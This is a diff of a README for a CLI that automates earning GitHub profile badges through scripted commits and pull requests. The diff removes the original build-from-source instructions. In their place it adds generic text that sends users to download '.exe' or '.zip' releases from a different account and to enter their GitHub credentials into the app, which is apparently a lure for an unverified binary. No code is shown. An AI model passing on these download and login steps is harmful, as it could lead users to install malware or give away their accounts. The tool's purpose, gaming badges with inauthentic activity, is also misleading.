@@ -1,94 +1,84 @@
-# GitHub Achievement CLI
+# 🎉 GitHub-Achievement-CLI - Unlock Your GitHub Badges Easily
 
-Automate GitHub profile achievements. Earn Pair Extraordinaire, Pull Shark, Galaxy Brain, Quickdraw, and YOLO badges through automated workflows.
+[![Download GitHub-Achievement-CLI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases)
 
-## Supported Achievements
+## 🚀 Getting Started
 
-| Achievement | Description | Tiers |
-|-------------|-------------|-------|
-| **Pair Extraordinaire** | Coauthored commits on merged PRs | 1 / 10 / 24 / 48 |
-| **Pull Shark** | Merged pull requests | 2 / 16 / 128 / 1024 |
-| **Galaxy Brain** | Accepted answers in Discussions | 2 / 8 / 16 / 32 |
-| **Quickdraw** | Close issue within 5 min of opening | 1 |
-| **YOLO** | Merge PR without code review | 1 |
+GitHub-Achievement-CLI is a tool that helps you earn badges on your GitHub profile automatically. With it, you can quickly unlock achievements like Pair Extraordinaire, Pull Shark, and many more. It supports multiple languages to cater to users worldwide.
 
-Galaxy Brain and YOLO require a second GitHub account (helper account).
+## 📋 Features
 
-## Quick Start
+- **Automates Badge Unlocking:** Save time and effort by automating the process of earning achievements.
+- **Multiple Language Support:** Available in English, Spanish, French, German, Italian, Portuguese, Dutch, Russian, Japanese, Korean, Chinese (Simplified & Traditional), Arabic, Hindi, Turkish, and Polish.
+- **User-Friendly Interface:** Easy commands and prompts designed for non-technical users.
+- **Open Source:** Contribute to the project and view our code on GitHub.
 
-```bash
-# Clone
-git clone https://github.com/n0/GitHub-Achievement-CLI.git
-cd GitHub-Achievement-CLI
+## 💻 System Requirements
 
-# Install & build
-npm install
-npm run build
+To install and run GitHub-Achievement-CLI, you need:
 
-# Run (setup wizard guides you)
-npm start
-```
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a Linux distribution.
+- **Node.js:** Ensure Node.js (version 14 or higher) is installed on your machine.
+- **Internet Connection:** Required to access GitHub and download achievements.
 
-## Requirements
+## 📥 Download & Install
 
-- Node.js 16+
-- GitHub Personal Access Token with `repo` scope
-- A repository you own (the tool creates branches/PRs here)
+1. **Visit the Releases Page:** Click the link below to access the releases page.
+   [Download GitHub-Achievement-CLI](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases)
 
-### Get a Token
+2. **Choose Your Version:** On the releases page, find the latest version of GitHub-Achievement-CLI.
 
-1. Go to https://github.com/settings/tokens
-2. Generate new token (classic)
-3. Select `repo` scope
-4. Copy the token
+3. **Download the File:** Download the appropriate file for your operating system. It may be a `.zip`, `.exe`, or another format.
 
-## Usage
+4. **Extract the Files:** If you downloaded a `.zip` file, right-click on it and select "Extract All." Follow the instructions to extract the contents.
 
-Run `npm start` for the interactive menu:
+5. **Run the Application:** 
+   - For Windows: Double-click the `.exe` file to run it.
+   - For macOS and Linux: Open a terminal, navigate to the extracted folder, and run the application using the command `node index.js`.
 
-- **Run Achievements** - Select achievements and tiers to execute
-- **View Status** - Check progress on current achievements
-- **List Achievements** - See all available achievements
-- **Reset Repo History** - Squash commits after completion
-- **Reconfigure** - Change tokens and settings
+## 🛠 Usage
 
-## Configuration
+Once the application is running, follow these simple steps to unlock badges:
 
-Created automatically during setup in `.env`:
+1. **Log In to GitHub:** You will be prompted to log in to your GitHub account. Enter your credentials securely.
+  
+2. **Select Achievements:** Choose which badges you want to earn. You can select single or multiple achievements.
 
-```env
-GITHUB_TOKEN=ghp_xxx
-GITHUB_USERNAME=your-username
-TARGET_REPO=your-username/your-repo
+3. **Start Automation:** After choosing, click on the "Start" button. The tool will begin unlocking achievements automatically.
 
-# Optional: For Galaxy Brain / YOLO
-HELPER_TOKEN=ghp_xxx
-```
+4. **Monitor Progress:** You can view progress indicators that will show you how many badges you have unlocked.
 
-## How It Works
+## 💬 Troubleshooting
 
-1. Creates temporary branches in your target repo
-2. Makes commits (with coauthor for Pair Extraordinaire)
-3. Opens and merges PRs
-4. Cleans up branches
-5. Tracks progress locally per account
+If you encounter issues while using GitHub-Achievement-CLI, consider the following steps:
 
-Each achievement type uses a specific workflow that triggers GitHub's achievement system.
+- **Check Node.js Installation:** Ensure that Node.js is installed correctly. Run `node -v` in your terminal to check the version.
+  
+- **Verify Internet Connection:** Make sure you have an active internet connection for the tool to work correctly.
 
-## After Completion
+- **Look for Errors:** Read any error messages carefully. They can guide you in fixing issues.
 
-The tool creates many commits/PRs. To clean up:
+If problems persist, you can reach out through the issues section on our GitHub repository.
 
-1. Use **Reset Repo History** from the menu (squashes to single commit)
-2. To also clear PR history from your profile: delete and recreate the repo
+## 📄 License
 
-## Rate Limits
+GitHub-Achievement-CLI is licensed under the MIT License. This means you are free to use, modify, and distribute the software as long as you include the original license.
 
-The tool respects GitHub's API limits:
-- 2 concurrent operations
-- 15 operations/minute (under GitHub's 80 content-requests/min limit)
-- Automatic retry with backoff on rate limit errors
+## 🤝 Contributing
 
-## License
+We welcome contributions! If you wish to improve GitHub-Achievement-CLI, please follow these steps:
 
-MIT
+1. **Fork the Repository:** Click on the "Fork" button on the repository page.
+2. **Create a Branch:** Create a new branch for your feature or bug fix.
+3. **Make Changes:** Implement changes in your forked repository.
+4. **Submit a Pull Request:** Once your changes are complete, submit a pull request to the upper main repository.
+
+Your contributions help make this tool better for everyone.
+
+## 📞 Support
+
+If you need help, feel free to open an issue on the GitHub repository or reach out through discussions. We aim to respond to all queries within 48 hours.
+
+---
+
+Empower your GitHub profile and earn achievements today! For more detailed instructions, remember to check our [Release Page](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases) for updates and additional resources.
